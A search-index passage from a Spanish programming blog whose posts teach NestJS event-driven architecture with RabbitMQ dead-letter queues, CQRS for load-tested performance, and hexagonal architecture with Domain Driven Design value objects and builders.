siguiente @Payload(). donde el Tipo Data es nuestra estructura de mensaje definida.@Payload() data: RabbitmqMessage&lt;Data&gt;la interface RabbitmqMessage es la siguiente:interface RabbitmqMessage&lt;T&gt; { id: string; pattern: string; timestamp: Date; data: T;}Nosotros nos debemos preocupar por solo el tipo de data los otros valores son definidos por la librería RabbitmqQueue.Iniciar RecoveryLo mismo para iniciar la aplicaión Recovery debes ir a tu proyecto Nestjs en este caso sería apps/recovery y en el archivo apps/recovery/main.ts debes invocar la función createRecoveryMicroserviceOptions el cual devolverá un objeto ClientProviderOptions el cual es necesario para iniciar un microservicio de Nestjsasync function bootstrap() { const options = { credentials: { host: 'localhost', password: 'guest', port: 5672, vhost: 'javel', user: 'guest' }, queue: { name: 'my-queue', deadLetter: { exchange: 'dlx', patterns: ['SEND_MESSAGE'] } } } const microservice = await RabbitmqQueueModule.createRecoveryMicroserviceOptions(options) const app = await NestFactory.createMicroservice(RecoveryModule, microservice); app.listen() }bootstrap();Definir Recovery controller para obtener mensajes que no pudieron ser procesados por Worker.Ahora para definir los controladores que consumirán los mensajes fallidos es de igual manera que nos indica la documentación de Nestjs. El valor de MessagePattern debe estar incluido en los valores de queue.deadLetter.patterns@Controller('dead-letter-queue')export class DeadLetterController { @EventPattern('SEND_MESSAGE', Transport.RMQ) async consume1(@Payload() data: RabbitmqMessage&lt;Data&gt;, @Ctx() context: RmqContext) { Logger.log('Dead-letter SEND_MESSAGE 1: ', data) } @EventPattern('SEND_MESSAGE2', Transport.RMQ) async consume2(@Payload() data: RabbitmqMessage&lt;Data&gt;, @Ctx() context: RmqContext) { Logger.log('Dead-letter SEND_MESSAGE 2: ', data) }}Iniciar ProducerPara iniciar nuestra aplicación solo debemos hacer un registro del RabbitmqQueueModule proporcionando nuestra configuración base en el módulo Nestjs que necesitemos producir mensajes@Module({ imports: [ RabbitmqQueueModule.register({ credentials: { host: 'localhost', password: 'guest', port: 5672, vhost: 'javel', user: 'guest' }, queue: { name: 'my-queue', deadLetter: { exchange: 'dlx', patterns: ['SEND_MESSAGE'] } } }) ], controllers: [ProducerController],})export class ProducerModule { }Ahora solo debemos injectar nuestro servicio productor de mensajes:import { RabbitmqProducerClient } from '@app/shared/rabbitmq-queue/services/rabbitmq-producer-client.service';@Injectable()export class MyService { constructor(private rabbitmq: RabbitmqProducerClient) { }}Ahora para enviar mensajes lo hacemos de la siguiente manera const data: Data = { name: 'rabbitmq-message', message: 'Simple message for testing' } const payload = this.rabbitmq.emitTo&lt;Data&gt;('SEND_MESSAGE', data)el metódo emitTo() nos devolverá el mensaje que enviará a Rabbitmq{ \"id\": \"bb322090-578d-4717-9d12-a38eadbd0311\", \"pattern\": \"SEND_MESSAGE\", \"timestamp\": \"2022-11-09T13:18:45.704Z\", \"data\": { \"name\": \"rabbitmq-message\", \"message\": \"Simple message for testing\" }}Generamos un controlador de pruebas para probar nuestra arquitectura orientada a eventos@Controller('producer')export class ProducerController { constructor(private rabbitmq: RabbitmqProducerClient) { } @Post() emitMessage(@Body() data: any) { const payload = this.rabbitmq.emitTo&lt;Data&gt;('SEND_MESSAGE2', data) Logger.log(`Producer: message sent ${payload.id}`) return { message: 'OK', messageSent: payload } }}Y generamos la siguiente instrucción en curl para realizar la petición:#!/bin/bashcurl -s -X POST -d '{\"name\": \"rabbitmq-message\",\"message\": \"testing message on event architecture\"}' -H 'Content-type: application/json' http://localhost:3001/producer | jqAdicional a este comando puedes hacer uso de Make para realizar las siguientes operaciones:#!/bin/bash# start a fucking rabbitmq servermake rabbit# start workermake worker# start recoverymake recovery# start producermake producer# send a requestmake produce# testing dead-lettermake produce; sleep 1; make produce; sleep 1; make produceFin del PostEsta es la forma más simple de utilizar una arquitectura orientada a eventos. Generamos un proyecto de tipo mono Repositorio para poder reutilizar nuestras piezas de software y seguir una misma implementación con Nestjs, La estrategia de mono repositorio debes analizarla bien, ya que dependerá de tus necesidades y tipo de proyecto pero para empezar a jugar no está mal.Github repositoryAcá el meme de despedida" }, { "title": "CQRS en Soluciones de Alto Rendimiento con Nestjs", "url": "/posts/alto-rendimiento-con-cqrs-eventos-en-nestjs/", "categories": "Programacion, Nestjs, Arquitectura de software, Typescript", "tags": "typescript, nestjs, hexagonal, microservices", "date": "2022-11-07 12:32:00 -0300", "snippet": "CQRS es una solución de diseño de software que separa las operaciones de lectura y escritura de nuestra aplicación. Esto no es mero capricho de la ingeniería de software. Este enfoque que proporciona CQRS nos ayuda a implementar soluciones de alto rendimiento en ambientes concurrentes. Alerta de spoiler CQRS se complementa de maravilla en arquitecturas orientadas a eventos, esta combinación nos proporciona un alto rendimiento, escalabilidad y una mejora en el diseño de las operaciones sobre nuestra aplicación.En post anteriores aprendimos arquitectura hexagonal utilizando una API backend basada en la base de datos Northwind la cual administra órdenes de compras, productos y proveedores. En esta ocasión les presentaré una solución de alto rendimiento a nivel de infraestructura con los casos de uso de crear y leer órdenes, una operación de lectura y la otra de escritura. El estado actual de esta aplicación es solo una API conectada a una base de datos relacional.Realizaremos la siguiente prueba de carga sobre nuestra aplicación. Simulación de ambiente concurrente con usuarios incrementando de 10 en 10 cada segundo hasta llegar a 300 usuarios. 150 usuarios crearán 1 orden cada 0.5 y 1.2 segundos. 150 usuarios leerán 100 órdenes cada 0.5 y 1.2 segundos.Esto en promedio realizarán entre 150 y 180 peticiones cada segundo.Utilizaremos Locust que es una librería Python para realizar pruebas de carga sobre aplicaciones web. Los detalles de como usarlo lo encuentras acá.Los puntos importantes a tener en cuenta para interpretar los resultados son las siguientes métricas: Total Requests per Seconds: RPS: Peticiones por segundo Failures: Peticiones fallidas Response Times (ms) Media response time y 95% percentile Number of users: Usuarios conectados en el tiempo. Las pruebas de cargas en nuestra APIResumiendo las pruebas de carga realizadas en una aplicación que utiliza 1 única base de datos de lectura y escritura muestra el siguiente rendimiento:En promedio 17 segundos de lecturas cada segundo. Y en modo individual haciendo las pruebas obtenemos esto: #!/bin/bash # GET ORDERS time curl -s \"http://localhost:3000/purchase/order?page=1&amp;size=10\" | jq# real\t0m18.185s 18 seconds!!!# user\t0m0.026s# sys\t0m0.016s# CREATE ORDERtime curl -s -X POST -d \"$(order.json)\" -H \"Content-Type: application/json\" http://localhost:3000/purchase/order | jq# real\t0m0.030s# user\t0m0.020s# sys\t0m0.011sLa escritura de los datos no ha perdido rendimiento, pero la escritura ha subido a tiempos considerables. Como vemos estamos bloqueando nuestro servidor por las peticiones, aumentaron los tiempos dramáticamente y en esta ocasión no es la idea escalar la base de datos o las instancias de la aplicación.Arquitectura inicialLa arquitectura inicial de esta aplicación era la siguiente:Ahora para lograr escalar nuestro sistema no lo haremos dándole más recursos a nuestra base de datos (escalado vertical) y tampoco subiremos la cantidad de instancias de la aplicación (escaldo vertical), Si bien esto en muchos casos es suficiente, También tendremos escenarios donde el costo beneficio no logrará ser eficiente subiendo los recursos y para no elevar los costos más de lo necesario debemos aprovechar los recursos disponibles al inicio antes de empezar el escalado de nuestra arquitectura.Arquitectura de alto rendimiento basada en microserviciosPara lograr la mejora del rendimiento en nuestro sistema la nueva arquitectura tendrá los siguientes puntos: Arquitectura hexagonal: Separación del dominio de la infraestructura (opcional). CQRS: Separación de las lecturas y escrituras sobre nuestro origen de datos. Arquitectura de microservicios: Tendremos un servicio que se encarga administrar los modelos, lecturas y escrituras de los datos, y 1 servicio encargado de sincronizar nuestro modelo de lectura. Broker de mensajería asíncrona: Intermediario que comunicará nuestros microservicios de manera desacoplada.Todo esto se plasma en el siguiente diagrama:Pruebas de carga sobre la nueva arquitecturaNuestra nuevo enfoque basado en microservicios esta listo y ahora si realizamos las mismas pruebas de carga sobre nuestra nueva arquitectura obtenemos los siguientes resultados:Una diferencia bastante notoria en este caso nos centramos en una solución a nivel de arquitectura representando la realidad de muchos sistemas a gran escala. No nos centramos en escalar nuestra aplicación y la base de datos sin antes aprovechar ya los recursos disponibles. Tampoco no siempre es viable reescribir una aplicación desde cero en lenguajes más eficientes como Go o Rust. En definitiva, tendremos muchos casos, realidades y tecnologías disponibles y nosotros como ingenieros debemos encontrar el mejor costo beneficio de una solución.Les dejo el repositorio para que puedan ver la implementación del código y puedas jugar con las pruebas de cargaGithub repositoryFinalizandoPara terminar nos despedimos con el meme de cortesía." }, { "title": "Arquitectura hexagonal Parte IV Patrones de arquitectura sobre la capa Application", "url": "/posts/implementando-hexagonal-con-nestjs-part4/", "categories": "Programacion, Nestjs, Arquitectura de software, Typescript", "tags": "typescript, nestjs, hexagonal", "date": "2022-11-07 12:32:00 -0300", "snippet": "En nuestro post anterior modelamos nuestro dominio y nuestras reglas de negocio con Domain Driven Design implementamos los conceptos y patrones más usados en este enfoque de desarrollo. En esta ocasión nos enfocaremos en nuestra capa de aplicación en la cual definimos nuestros casos de uso. En este post definiremos patrones de arquitectura que nos permitirán crear un código mantenible y escalable.¿Qué componentes se encuentran en nuestra Capa Application?Los componentes que podemos encontrar en esta capa son los siguientes: Application Services: Son nuestros casos de uso o los llamados features de nuestra aplicación. Ports: componentes que deben interactuar con servicios externos o componentes de carácter más técnicos que no se relacionan con el dominio, por ejemplo un componente que necesite enviar emails Event Subscribers: Componentes que se suscriben a eventos y deben ejecutar algún caso de uso o featureLa principal diferencia entre los servicios de aplicación y servicios de dominio es que los servicios de dominio contienen lógicas y reglas de negocio asociadas a las entidades, mientras que los servicios de aplicación hacen uso de los componentes de dominio coordinando el uso de los servicios de dominio u los otros componentes existentes para cumplir con el objetivo del caso de uso o feature asociado.Estructura básica de la capa ApplicationLa estructura de la capa application: core├──  application│ ├──  events│ │ └──  subscribers│ │ └──  StockUpdaterSubscriber.ts│ ├──  ports│ │ └──  EmailSender.ts│ └──  services│ ├──  CatalogUseCases.ts│ └──  PurchaseUseCases.ts└──  domain ├──  entities ├──  repositories └──  servicesNuestros casos de uso:export class PurchaseUseCases { constructor(private order: OrderService) { } async createOrder(createorder: CreateOrderDto): Promise&lt;OrderCreatedDto&gt; { return this.order.create(createorder) // creating an order instance .then(order =&gt; this.order.save(order)) // save to database .then(order =&gt; order.getSummary()) // return summary } async getOrders(getorder: GetOrdersRequest) { const offset = getorder.page - 1 // define offset for query const orders = await this.order.getOrdersSlice(getorder.size, offset) // get orders slice const totalRecords = await this.order.getOrdersCount() // data count // creating a paginated return Paginated.create({ ...getorder, count: totalRecords, data: orders, }) }}export class CatalogUseCase { constructor(private product: ProductService) { } async getProductsByFilter(filter: filtersRequest) { const offset = filter.page - 1 // define offset for query const products = await this.products.getProductsByFilter(filter) // get products const totalRecords = await this.order.countProductByFilter(filter) // data count // creating a paginated return Paginated.create({ ...filter, count: totalRecords, data: products, }) }}En este enfoque nos enfocamos en definir los casos de uso, pero en algunas implementaciones de arquitectura hexagonal se definen los controladores dentro de la capa de aplicación es un enfoque válido ya que muchas veces nuestra aplicación es solo un API CRUD donde los casos de uso y la lógica de dominio no son tan complejas. Estas implementación generalmente utilizan librerías de terceros o frameworks en sus controladores y hacen llamado de los servicios de aplicación o incluso solo de los servicios de aplicación. core├──  application│ ├──  controllers│ │ ├──  catalog.controller.ts│ │ └──  purchase.controller.ts│ └──  services│ ├──  CatalogUseCases.ts│ └──  PurchaseUseCases.ts└──  domain ├──  entities ├──  repositories └──  servicesExponiendo los servicios de aplicaciónPara hacer uso de nuestros casos de uso solo debemos inyectar nuestros servicios de aplicación en componentes de tipo presentacional como lo puede ser un Controlador Rest y hacer uso de los métodos expuestos por nuestros casos de uso.// using Get products use case const products = await = this.catalog.getProductByFilter(filter)En casos simples, este enfoque puede ser suficiente como una API CRUD. Pero cuando nuestra aplicación contiene lógicas de dominio complejas, las que pueden evolucionar en el tiempo y no queremos que estos cambios rompan las interacciones entre clientes y servicios y a su vez queremos escalabilidad Necesitamos otro enfoque.Usando CQRS dentro de nuestra capa applicationDentro del diseño de nuestra capa de dominio y aplicación podemos implementar CQRSel cual significa segregación de responsabilidades de comandos y consultas, Un elegante significado en el mundo de las arquitecturas limpias. Básicamente, CQRS es un patrón de diseño el cual separa las operaciones de lectura y escritura sobre un almacén de datos. La implementación de CQRS en una aplicación puede maximizar el rendimiento y la escalabilidad. La flexibilidad que nos entrega este enfoque nos permite que nuestro sistema evolucione mejor con el tiempo y evita que procesos de actualización y lectura provoquen conflictos de combinación en nuestra capa de dominio.En resumen, CQRS No solo mejora la arquitectura de las operaciones sobre nuestro dominio, sino que nos provee una manera efectiva para mejorar el rendimiento y escalabilidad de nuestra aplicación.¿Por qué o cuando debería implementar CQRS?CQRS nos da una interfaz común para que nuestros componentes de tipo cliente o ui puedan comunicarse a través de comandos y queries. CQRS también se utiliza en aplicaciones de alto rendimiento. Al separar las consultas de los comandos, podemos separar nuestras fuentes de datos en una de lectura y otra de escritura, con lo que podríamos escoger un motor de base datos adaptado a nuestras necesidades de dominio y no al revés, así evitamos adaptar nuestro código a estrategias de performance que de una u otra manera pueden contaminar nuestro dominio. También Fomenta el uso del asincronismo en acciones más lentas, podemos emplear comandos y definir quien atiende a esa petición sin bloquear el proceso actual.CQRS y arquitecturas orientadas a eventosEste enfoque se complementa perfecto con patrones de arquitectura orientados a eventos donde definimos subscriptores que estarán a la escucha sobre eventos específicos pueden ser tanto eventos de dominio como eventos de integración cuando un evento se produzca nuestros subscriptores ejecutaran lógicas de negocio a través de los servicios de aplicación entonces teniendo estos 3 componentes: Comandos: acciones que causan efectos secundarios sobre el dominio (escritura) Queries: acciones que devuelven datos relacionados al dominio (lectura) Eventos: eventos relacionados con sucesos ocurridos dentro nuestro dominio o eventos enviados por otras aplicaciones.Podemos definir una arquitectura para exponer nuestros casos de uso mediante una interfaz común, esta sería nuestra API de la copa core (application y domain)CQRS con NestjsEn esta ocasión implementaremos CQRS con Nestjs y su módulo cqrs este módulo es muy comodo, ya que nos provee una forma limpia de implementar comando, queries e incluso eventos mediante anotaciones e inyectando los componentes CommandBus, QueryBus y EventBus. CQRS por debajo implementa los siguientes patrones de diseño: Mediator y CommandInstalamos nuestro módulo:npm install --save @nestjs/cqrsPara hacer uso de comandos en cqrs debemos crear una clase que represente los datos de entrada de nuestro comando. Al definir un comando debemos también definir un handler que no es nada más que una clase con la anotación @CommandHandler finalmente debemos agregarlo como provider dentro de nuestro módulo core.// command to create a orderexport class CreateOrderCommand { constructor(public readonly order: CreateOrderDto) { }}// handler for create order command@CommandHandler(CreateOrderCommand)export class CreateOrderHandler implements ICommandHandler&lt;CreateOrderCommand&gt; { constructor(private purchase: PurchaseUseCases) { } async execute(command: CreateOrderCommand) { this.purchase.createOrder(command.order) }}Podemos implementar múltiples handlers para nuestro comando en algunos escenarios, puede ser útil como un log de los datos como de auditoria.Ahora implementaremos nuestras cqrs queries y sus handler:// query for ordersexport class OrdersQuery { constructor(public readonly page: number, public readonly size: number){}}// handler@QueryHandler(OrdersQuery)export class OrdersQueryHandler implements IQueryHandler&lt;OrdersQuery&gt;{ constructor(private purchase: PurchaseUseCases) { } execute(query: OrdersQuery): Promise&lt;Paginated&lt;Order&gt;&gt; { return this.purchase.getOrders(query) }}Ahora para poder realizar nuestros comandos y queries debemos inyectar en nuestro PurchaseController los componentes QueryBus y CommandBus.@Controller('/purchase')export class PurchaseController { constructor( private command: CommandBus, private query: QueryBus ) {} }Ahora desde nuestros endpoints hacemos uso de nuestros CommandBus y QueryBus @Post('/order') async create(@Body() order: CreateOrderRequest): Promise&lt;OrderCreatedDto&gt; { return await this.command.execute(new CreateOrderCommand({ ...order })) } @Get('/order') async getOrders(@Query('page')page: number, @Query('size') size: number) { return this.query.execute(new OrdersQuery(page, size)) }}CQRS dentro de nuestra aplicación está lista. Ahora configuraremos la escucha de eventos. Nuestra aplicación ya posee una implementación de EventBus y subscripción de eventos, pero utilizaremos las herramientas que nos provee nestjs para mostrar la utilidad del módulo cqrsImplementamos un nuevo servicio de aplicación para contener los casos de usos asociados al contexto de Stock.@Injectable()export class StockUseCase { constructor(private product: ProductService) {} async updateStockProducts(order: Order) { for (let detail of order.details) { await this.product.updateProductStock(detail.product.productId, detail.quantity) } }}Implementación de eventos, reutilizaremos nuestro evento de dominio ya definido anteriormente OrderCreated y haremos una reimplementación de nuestro puerto DomainEventBus utilizando el servicio EventBus del módulo @nest/cqrs// port export interface EventBusPublisher { publish(event: EventBase): void }// adapter@Injectable()export class EventBusPublisherDomain implements EventBusPublisher { constructor(private eventbus: EventBus){} async publish(event: EventBase): Promise&lt;void&gt; { await this.eventbus.publish(event) }}En esta ocasión vemos el poder de los puertos y adaptadores, nos permite una migración de tecnologías sin mayores contratiempos, solo debemos modificar nuestro módulo core para realizar las inyecciones correspondientes. Finalmente implementamos nuestro EventHandler.// handler@EventsHandler(OrderCreatedEvent)export class OrderCreatedHandler implements IEventHandler&lt;OrderCreatedEvent&gt; { constructor(private stock: StockUseCase) { } async handle(event: OrderCreatedEvent) { const order = event.orderCreated.getData() await this.stock.updateStockProducts(order) } }Publicación de evento OrderCreated:export class OrderService { constructor( private readonly order: OrderRepository, private readonly eventbus: EventBusPublisher ) { } async save(order: Order): Promise&lt;Order&gt; { return this.order .save(order) .then(orderId =&gt; { order.orderId = orderId return order }) .then(order =&gt; { this.eventbus.publish(new OrderCreated(order))// publish domain event return order }) } // ...hidenn code}Estructura final de la aplicación:Nuestra aplicación queda de la siguiente manera agregamos el directorio entrypoint dentro de nuestra capa application la cual define la manera de interactuar con nuestros casos de usoeste enfoque nos da claridad de las acciones de lectura, escritura y escucha de eventos. core├──  application│ ├──  entrypoint│ │ ├──  commands│ │ │ ├──  CreateOrderCommand.ts│ │ │ └──  handlers│ │ │ └──  CreateOrderHandler.ts│ │ ├──  events│ │ │ └──  handlers│ │ │ └──  OrderCreatedHandler.ts│ │ └──  queries│ │ ├──  handlers│ │ │ └──  OrdersQueryHandler.ts│ │ └──  OrdersQuery.ts│ ├──  services│ │ ├──  CatalogUseCases.ts│ │ ├──  CompanySuppliersUseCases.ts│ │ ├──  CompanyUseCases.ts│ │ ├──  CustomerPortfolioUseCases.ts│ │ ├──  PurchaseUseCases.ts│ │ └──  StockUseCases.ts│ └──  utils│ └──  Paginated.ts├──  core.module.tsConclusionesBásicamente, CQRS nos permite separar las escrituras y lecturas de nuestro dominio para poder crear sistemas escalables. Este post no terminará aca, ya que no hemos visto los beneficios de escalabilidad que nos entrega CQRS y las arquitecturas orientadas a eventos. Pero esos será en unos próximos posts.Meme de cortesíaPuedes ver los demás artículos de arquitectura hexagonal acá 😉 Arquitectura hexagonal Parte I Arquitectura hexagonal Parte II Arquitectura hexagonal Parte III Github repository" }, { "title": "Arquitectura hexagonal Parte III Modelando el Dominio a Fondo con Domain Driven Design", "url": "/posts/implementando-hexagonal-con-nestjs-part3/", "categories": "Programacion, Nestjs, Arquitectura de software, Typescript", "tags": "typescript, nestjs, hexagonal", "date": "2022-11-07 12:32:00 -0300", "snippet": "En post anteriores vimos como implementar una arquitectura hexagonal y aprendimos sus principales conceptos y componentes. En esta oportunidad modelaremos en profundidad el Dominio de nuestra aplicación aplicando Domain Driven Design.Arquitectura Hexagonal y Domain Driven Design son clean architecture. Hexagonal y DDD se complementan muy bien pero son cosas distintas mientras hexagonal hace enfasis en separar mediante adaptadores y puertos el dominio y los casos de uso de la infraestructura DDD se centra en el diseño de la capa de dominio. En resumen básicamente la diferencia es que hexagonal se enfoca más en los adaptadores y puertos para desacoplar nuestro modelo de las tecnologías empleadas mientras que DDD es el diseño orientado al dominio de negocio y los casos de uso después de este breve resumen vamos al maldito códigoCreando un microservicio para registrar usuariosLa aplicación que crearemos será un servicio para administrar usuarios iremos iterando sobre algunos caso de uso simples e implementaremos un modelado de dominio a fondo utilizando Domain Driven Design empezaremos por el siguiente caso de uso:Creación de usuarios Se necesita un servicio que cree usuarios donde el username debe tener el siguiente formato: la primera letra del nombre seguido de un punto y de su apellido, en caso de que exista un usuario con esta nomenclatura se debe agregar un número correlacional ejemplo : para el empleado john wick su usuario sería j.wick00 y jordan wick sería j.wick01 al crear el usuario debemos notificarlo mediante un emailMuy bien creamos nuestra app Nestjs y sus módulosnest new user-micro-servicecd user-micro-servicenest generate module corenest generate module infraestructureAhora generamos la siguiente estructura básica de de directorios──  core│ ├──  application│ │ ├──  ports│ │ └──  services│ ├──  core.module.ts│ ├──  domain│ │ ├──  model│ │ └──  ports│ │ │ ├──  inbound│ │ │ └──  outbound│ │ ├──  services│ └──  shared│ ├──  dto│ └──  error├──  infraestructure│ ├──  adapters│ └──  infraestructure.module.tsCon esta estructura empezaremos a aplicar DDD como locos1 - Definiendo EntidadesCrearemos una clase abstract base para nuestras entidadesexport abstract class Entity&lt;T&gt;{ id: Id; abstract equalsTo(entity: T): boolean;}Esta clase define el método abstracto equalsTo() para que sus clases hijas tengan que implementar la lógica de igualdad en entidades. Entonces la forma básica de definir nuestras entidades sería la siguiente:export class User&lt;User&gt; { username: string; email: string; confirmed: boolean; equalsTo(entity: User): boolean { return this.id.getValue() === entity.id.getValue() }}Definimos valores primitivos y los asignamos nada del otro mundo, como definimos nuestras clases en la mayoría de los proyectos que hemos trabajado, pero esto tiene un detalle los valores primitivos pueden representar cosas totalmente alejadas a nuestro dominio, pueden romper reglas de negocio incluso la integridad de los datos almacenados si no existen restricciones en el motor de base de datos escogido veamos este ejemplo:const user = new User()user.email = 'john.carter' // this in not a emailuser.username = 'a john le gusta la c...' // XDEsto no representa nuestra entidad, esto no es correcto generalmente en enfoques tradicionales agregamos validaciones a nivel de peticiones HTTP o restricciones de base de datos, o podemos delegar esta responsabilidad a servicios de dominio u otra lógica de negocio.Pero somos ingenieros de software y vamos por una solución mas cercana al dominio.2 - Value Objects en el DominioVamos a redefinir nuestra Entidad reemplazando nuestras variables primitivas por unos nuevos objetos llamados ValueObjects estos objetos son una especie de envoltura sobre valores primitivos para poder representar uno o más valores relacionados con nuestro modelo de dominio estos son objetos inmutables una vez instanciados no debemos cambiar su valor. La principal diferencia entre una entidad y un Value Object es que una entidad posee identidad es decir que contiene un valor como una id que lo identifica como único en nuestra aplicación en cambio el value object para compararlo debes comparar todas sus propiedades.Ahora crearemos el siguiente value objectexport class Email { constructor(private email: string) { } getValue() { return this.email } }Este nuevo objeto solo es una envoltura de un valor primitivo ¿Pero de qué nos sirve crear esto que beneficios nos trae? Parece ser código de sobra. Bien si nuestro value object no sirve para nada hasta ahora. Pero como esta clase representa un Email vamos a agregar la siguiente lógica de validación:export class Email { constructor(private email: string) { if (!this.validate(email)) { throw new EmailValidException(`Email value ${email} is not valid`) } } validate(email: string) { const res = /^(([^&lt;&gt;()\\[\\]\\\\.,;:\\s@\"]+(\\.[^&lt;&gt;()\\[\\]\\\\.,;:\\s@\"]+)*)|(\".+\"))@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\])|(([a-zA-Z\\-0-9]+\\.)+[a-zA-Z]{2,}))$/; return res.test(String(email).toLowerCase()); } getValue() { return this.email } }Ahora nuestro ValueObject tiene sentido entonces para ahorrar esfuerzo en crear más ValueObject crearemos una clase base abstracta:export abstract class ValueObjectBase&lt;T&gt; { protected abstract validate(value: T): boolean; constructor(private primitiveValue: T, errorMessage: string) { if (!this.validate(primitiveValue)) throw new DomainException(errorMessage) } getValue() { return this.primitiveValue }} Aplicamos Template method para reutilizar lógica y extender su funcionalidad mediante sus hijos.y definiremos nuevos value objects de la siguiente manera:// Emailexport class Email extends ValueObject&lt;string&gt; { constructor(email: string) { super(email, `Invalid Email Address: ${email}`) } validate(email: string) { const res = /^(([^&lt;&gt;()\\[\\]\\\\.,;:\\s@\"]+(\\.[^&lt;&gt;()\\[\\]\\\\.,;:\\s@\"]+)*)|(\".+\"))@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\])|(([a-zA-Z\\-0-9]+\\.)+[a-zA-Z]{2,}))$/; return res.test(String(email).toLowerCase()); } }// Id export class Id extends ValueObject&lt;string&gt; { constructor(private id: string) { super(id, `Invalid UUID Id:${id} `) } validate(id: string) { const re = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i return re.test(id) } static generate() { return new Id(uuidv4()) } }Finalmente nuestro Username ValueObject tendra la lógica asociada a nuestro caso de uso del formato de nombre de usuario.export class Username extends ValueObject&lt;string&gt;{ constructor(username: string) { super(username, `Username ${username} doesn't follow Northiwind policies`) } /** * Username must be first letter of name followed by dot, lastname and number Ex: \"a.smith0\" or \"a.smith1\" * @param username */ validate(username: string) { if (!username.includes('.')) { return false } const split = username.split('.') if (split[0].length !== 1) { return false } return true } static createUsernameBase(firstname: string, lastname: string) { return `${firstname[0]}.${lastname}` } static create(firstname: string, lastname: string) { return new Username(`${this.createUsernameBase(firstname, lastname)}00`) } static createWithIdentity(firstname: string, lastname: string, identity: number) { const userNumber = String(identity).padStart(2, '0') return new Username(`${this.createUsernameBase(firstname, lastname)}${userNumber}`) }}Ahora el concepto de value object toma más sentido y nos da una manera de crear reglas de negocio o validaciones de propiedades más cerca de nuestro dominio. En el desarrollo clásico estas validaciones las delegamos en librerías de terceros de validaciones o a servicios de negocio, Pero no siempre validamos un email o un largo de un texto tenemos que tener en cuenta que podemos encontrar reglas de negocio que no existirán en librerías de terceros.Nuestra entidad queda así:export class User extends Entity { username: Username; email: Email; confirmed: boolean;}Y el siguiente código nos arrojaría una excepción de dominioconst user = new user()user.email = new Email('juan.lorca.gmail') // throw DomainException() Invalid emailCon este enfoque controlamos la creación de objetos con mas coherencia pero también tenemos una desventaja, Con entidades grandes la instanciación de nuestros objetos se vuelve tediosa y con excesivo código en muchos casos. Para solucionar esto podemos aplicar el patrón de diseño Builder:export class UserBuilder { private user: User = new User() id(id: Id | string) { this.user.id = typeof id === 'string' ? new Id(id) : id return this } username(username: Username | string) { this.user.username = typeof username === 'string' ? new Username(username) : username return this } email(email: Email | string) { this.user.email = typeof email === 'string' ? new Email(email) : email return this } confirmed(confirmed: boolean) { this.user.confirmed = confirmed return this } build() { return this.user }} El pátron builder nos provee una manera de crear objetos complejos desde un objeto base y puede ir componiendose de más partes a medida que llamamos operaciones secuenciales para construir nuestro objeto finalEl funcionamiento de este patrón es simple:// creamos instancia de UserBuilder const builder = new UserBuilder()// internamente se instancia un objeto Userprivate user: User = new User()// definimos metodos que reciben propiedades y las seteamos en nuestra instancia de User y devolvemos la instancia de UserBuilder con \"this\". De esta manera podemos encadenar los métodos de creación o devolver el mismo objeto builder para usarlo en futuras operacionesemail(email: Email | string) { this.user.email = typeof email === 'string' ? new Email(email) : email return this}// Cuando ya setemaos las variables deseadas de nuestro User hacemos un llamado a l metodo build() y este devolvera el objeto Userbuild() { return this.user}Lo siguiente será definir la lógica de creación o inicialización de usuarios a nuestra entidad ya definido nuestro builder lo declararemos como una clase interna de User y a su vez declararemos el constructor de user como privado para que solo User pueda instanciarse mediante las operaciones relacionadas con el dominio.class User { private constructor() {} // values private static UserBuilder = class { // code... }}tambien definiremosAhora empleamos nuestro builder de la siguiente manera en la entidad User agregando el método estático create() nuestra entidad quedaría así.export class User extends Entity { username: Username; email: Email; confirmed: boolean; static create(user: CreateNewUserDto): User { const { username, email } = user const id = Id.generate() return new this.UserBuilder() .id(id) .username(username) .email(email) .confirmed(false) .build() } equalsTo(e: User): boolean { return this.id.getValue() === e.id.getValue() } private static UserBuilder = class { private user = new User() constructor() {} id(id: Id | string) { this.user.id = typeof id === 'string' ? new Id(id) : id return this } username(username: Username | string) { this.user.username = typeof username === 'string' ? new Username(username) : username return this } email(email: Email | string) { this.user.email = typeof email === 'string' ? new Email(email) : email return this } confirmed(confirmed: boolean) { this.user.confirmed = confirmed return this } build() { return this.user } }}Muy bien ya aplicamos una solución al excesivo código boiler plate que nos puede generar entidades con un montón de ValueObject3 - Definición de puertos y adaptadores hexagonal y Domain Driven Design Juntosresumiendo de nuestro primer post Arquitectura hexagonal Parte I Los puertos son las entradas y salidas que nuestro dominio tiene para comunicarse con el resto de la aplicación es decir con infraestructura, tenemos 2 tipos de puertos: inbound (entrada): representan los cambios de estado que queremos realizar en nuestro dominio como puede ser la actualización de el nombre de un usuario outbound (sálida): Representan los cambios que nuestro dominio quiere realizar fuera de él. Por ejemplo actualizar una base de datosAhora definimos nuestros puertos casos de uso y redefinimos nuestros componentes a compartir en el directorio shared├──  core│ ├──  application│ │ ├──  services│ │ | ├──  CreateUserService.spec.ts│ │ | └──  CreateUserService.ts| | └──  CreateUser.ts│ ├──  core.module.ts│ ├──  domain│ │ ├──  model│ │ │ ├──  entities│ │ │ │ └──  User.ts│ │ │ └──  valueobjects│ │ │ ├──  Email.spec.ts│ │ │ ├──  Email.ts│ │ │ ├──  Username.spec.ts│ │ │ └──  Username.ts│ │ ├──  ports│ │ │ ├──  inbound│ │ │ │ └──  UniqueUsernameGenerator.ts│ │ │ └──  outbound│ │ │ └──  UserRepository.ts│ │ └──  services│ │ ├──  UniqueUsernameGeneratorService.spec.ts│ │ └──  UniqueUsernameGeneratorService.ts│ └──  shared│ ├──  application│ │ └──  ports│ │ └──  outbound│ │ └──  email-service│ │ ├──  EmailMessage.ts│ │ └──  EmailService.ts│ ├──  domain│ │ ├──  Entity.ts│ │ ├──  ValueObject.ts│ │ └──  valueobjects│ │ ├──  Id.spec.ts│ │ └──  Id.ts│ ├──  dto│ │ ├──  CreateUserDto.ts│ │ └──  RegisterEmailNotificationDto.ts│ └──  error│ └──  DomainException.tsDefinición de puertos de dominioexport interface UniqueUsernameGenerator { generate(firstname: string, lastname: string): Promise&lt;Username&gt;}export interface UserRepository { save(user: User): Promise&lt;void&gt;; findByUsernameStartWith(username: string): Promise&lt;User[]&gt;;}Definición de puertos de aplicación// Use caseexport interface CreateUser { create(createUser: CreateUserDto): 